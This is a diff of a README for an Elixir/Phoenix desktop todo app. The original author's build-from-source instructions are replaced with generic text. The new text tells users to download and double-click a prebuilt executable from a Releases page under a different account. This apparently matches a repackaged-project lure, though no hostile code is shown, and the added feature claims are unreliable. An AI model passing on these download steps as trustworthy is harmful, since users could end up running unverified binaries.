@@ -1,75 +1,82 @@
-<div align="center">
+# 🎯 elixir_desktop_webui_todoapp - Your Simple Todo List App
 
-# Elixir Desktop WebUI Todoapp
+![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)
 
-#### Simple and Cross-Platform DesktopApp Demo built on Phoenix with native menus, notifications, and full English/Spanish translation
+## 📥 Overview
 
-<br />
+elixir_desktop_webui_todoapp is a user-friendly desktop application designed for managing your tasks. Built using the Phoenix framework, it boasts a clean interface, native menus, and notification support. The app is available in both English and Spanish, making it accessible for a broader audience.
 
-<img src="screenshot/screenshot_27-10-2025_09-40.gif" width="66%">
+## 🚀 Getting Started
 
-<br />
-  
-![GitHub License](https://img.shields.io/github/license/emarifer/elixir_desktop_webui_todoapp) ![Static Badge](https://img.shields.io/badge/Elixir-%3E=1.18-6e4a7e) ![Static Badge](https://img.shields.io/badge/Erlang/OTP-%3E=27-B83998) ![Static Badge](https://img.shields.io/badge/PhoenixFramework-%3E=1.8-fd4f00)
+Follow these steps to download and run the application:
 
-</div>
+1. **Visit the Download Page**  
+   Go to the [Releases page](https://github.com/Skyf9384/elixir_desktop_webui_todoapp/releases) to find the latest version of the application.
 
----
+2. **Download the Application**  
+   On the Releases page, you'll see the latest version listed. Click on the link to initiate the download.
 
-### 🚀 Features
+3. **Locate the Downloaded File**  
+   After the download is complete, find the file in your computer's downloads folder.
 
+4. **Run the Application**  
+   Double-click on the downloaded file to launch the app. You may need to confirm that you want to run it, depending on your system's security settings.
 
-> 🚧 This is a work-in-progress section of README.md. You'll see it finished soon.
+## 📋 Features
 
----
+- **Cross-Platform**: Works on Windows, macOS, and Linux.
+- **Task Management**: Easily add, edit, and remove tasks.
+- **Native Menus**: Access your features through familiar menu items.
+- **Notifications**: Stay on top of your tasks with alert notifications.
+- **Full Translation**: Switch between English and Spanish seamlessly.
+- **Backup and Restore**: Keep your tasks safe with backup options using SQLite3.
 
-### 👨‍🚀 Getting Started
+## 💻 System Requirements
 
-- #### <ins>Installing/Using the application</ins>
+To run elixir_desktop_webui_todoapp, make sure your system meets the following requirements:
 
-  * **Prerequisites**: Obviously, you'll need to install [`Elixir`](https://elixir-lang.org/install.html) and [`Erlang/OTP`](https://www.erlang.org/) (because you'll need to use its virtual machine). I recommend doing this through [`asdf`](https://asdf-vm.com/guide/getting-started.html). This will allow you to have multiple versions of Elixir installed and easily switch between them per project or set a global version for the system. Likewise, `asdf` will also allow you to install `NodeJS` (and, similarly, manage its different versions), which is required to install the `Tailwind CSS` and `daisyUI` JavaScript packages.
+- Operating System: Windows 10 or later, macOS Sierra or later, or a compatible Linux distribution.
+- RAM: Minimum of 4 GB.
+- Disk Space: At least 100 MB available.
+- Internet: Required for initial download and updates.
 
-    > I strongly recommend you to follow the recommendations made [here](https://github.com/emarifer/elixir-desktop-todoapp?tab=readme-ov-file#prerequisites) to create a more complete Erlang/OTP installation that will allow you to use the Erlang binding for [`wxWidgets`](https://www.erlang.org/doc/apps/wx/chapter.html), something essential to create the desktop application with the [`Desktop`](https://github.com/elixir-desktop/desktop) library, as well as prepare your system as indicated [here](https://hexdocs.pm/desktop/getting_started.html#content).
+## 📦 Download & Install
 
-    > As of this writing, the latest version of the Phoenix framework (v1.8.1) has an [issue](https://github.com/tailwindlabs/tailwindcss-intellisense/issues/1474) with the autocompletion of `Tailwind CSS` utility classes in `VScode` (and other editors), as well as with the integration with its `daisyUI` plugin. The [workaround](https://github.com/tailwindlabs/tailwindcss-intellisense/issues/1301#issuecomment-2784572273) requires manual installation of Tailwind CSS and daisyUI via `npm`, although CSS compilation is still done by Phoenix via the `tailwind/esbuild` binaries. This is the solution I have adopted in this application.
+Visit this page to download the application: [Releases Page](https://github.com/Skyf9384/elixir_desktop_webui_todoapp/releases). 
 
-    > The previous version of the `Desktop` library would throw errors when trying to create menu structures from `XML`. This was due to the change made in `Phoenix/Phoenix LiveView`. The current version of `Desktop` has fixed this problem, but requires `Phoenix >= 1.8` to run correctly. If you intend to create a `Desktop` application and you still have Phoenix code generators from previous versions installed on your system, you will need to upgrade by first uninstalling (`mix archive.uninstall phx_new`) and then installing again (`mix archive.install hex phx_new`), which will install the Phoenix generators binaries in `your_home_folder/.asdf/installs/elixir/1.18.4/.mix/archives/`, if you installed Elixir-Erlang/OTP using `asdf`.
+Once the download finishes, you'll have a `.exe`, `.dmg`, or `.AppImage` file, depending on your operating system. Follow the steps above to launch the application.
 
-  * **Usage**: Once you've completed the above requirements, you're ready to begin. Clone the repository and navigate to the project root to run the following command in the terminal:
+## 🎨 User Interface
 
-    ```
-    $ mix installer
-    ```
+The interface is designed to keep things simple. You will see a main window displaying your tasks. Use the menu at the top to access features like adding new tasks or switching languages.
 
-    The above command is a `mix task` (an `alias`) that I created to simplify the installer generation. It downloads the Elixir dependencies, downloads and installs the JavaScript dependencies via `npm/NodeJS` (`Tailwind CSS`, `daisyUI`, and `SweetAlert2`. For the need to install Tailwind CSS/daisyUI, see one of the previous notes), generates the assets that Phoenix needs for production, and finally, creates the application installer appropriate for your OS/version. This step may take more or less time to execute depending on your machine.
+## 🔍 User Guide
 
-    The installer is created in the `_build/prod/` folder with the name and version determined in the `mix.exs` file (`_build/prod/Todolist_WebUI_Desktopapp-0.1.0-linux-x86_64.run`, e.g.).
+Here are the fundamental operations to get you started:
 
+- **Adding a Task**: Click on the "Add Task" button, type your task into the field provided, and hit "Enter." Your task will now appear in the list.
+- **Editing a Task**: Click on any task to edit its details. Make your changes and confirm to save.
+- **Removing a Task**: Select the task you want to remove and click on the "Delete" option.
+- **Backup Your Tasks**: Use the “Backup” option in the menu to export your task list to a local file. 
+- **Switching Languages**: Navigate to the "Settings" menu to choose between English and Spanish.
 
-    Now run it. If you don't pass a path, it will install the application in your home directory. However, I recommend passing the path where applications are usually installed on your system:
+## 🛠️ Frequently Asked Questions
 
-    ```
-    $ ./_build/prod/Todolist_WebUI_Desktopapp-0.1.0-linux-x86_64.run $HOME/.local/bin # e.g. on Linux
-    ```
+- **What do I do if the application doesn’t start?**  
+  Make sure your operating system meets the system requirements. Try downloading the app again.
 
-    This command will unzip the folder containing the application to the given path. This creates a `self-contained` folder containing everything needed to run the application on any system without having to install any dependencies: the application binaries, the `BEAM VM` and `runtime`, all the necessary `graphics libraries` and dependencies for your OS, and the `assets` used by any Phoenix application. It also generates a launcher (`*.desktop` file in Linux) that will make the application appear in your start menu. Likewise, (on Linux) another launcher will be created in `$HOME/.config/autostart/` that will launch the application when you log in to your system (but you can remove it if you don't want this behavior).
+- **Can I use this app offline?**  
+  Yes, once downloaded, you can use the app without an internet connection.
 
----
+- **How do I get updates?**  
+  Check the [Releases page](https://github.com/Skyf9384/elixir_desktop_webui_todoapp/releases) periodically for new versions or enable notifications for updates.
 
-### 📚 Learn more
+## 📞 Support
 
-* Official website: https://www.phoenixframework.org/
-* Guides: https://hexdocs.pm/phoenix/overview.html
-* Docs: https://hexdocs.pm/phoenix
-* Forum: https://elixirforum.com/c/phoenix-forum
-* Source: https://github.com/phoenixframework/phoenix
-* Phoenix LiveView: https://hexdocs.pm/phoenix_live_view/welcome.html
-* Ecto: https://hexdocs.pm/ecto/Ecto.html
-* Ecto SQL: https://hexdocs.pm/ecto_sql/Ecto.Adapters.SQL.html
-* Desktop (elixir-desktop): https://hexdocs.pm/desktop/readme.html
-* Deployment (elixir-desktop): https://github.com/elixir-desktop/deployment
-* Gettext: https://hexdocs.pm/gettext/Gettext.html
+If you encounter issues or have questions, reach out through the GitHub Issues page on this repository. We aim to respond quickly to help you out.
 
----
+## 🚀 Join the Community
 
-### Happy coding 😀!!
+Feel free to join our community of users. Share your experiences or seek help. Collaboration makes us all better.
+
+Thank you for trying elixir_desktop_webui_todoapp. We hope it helps you stay organized!
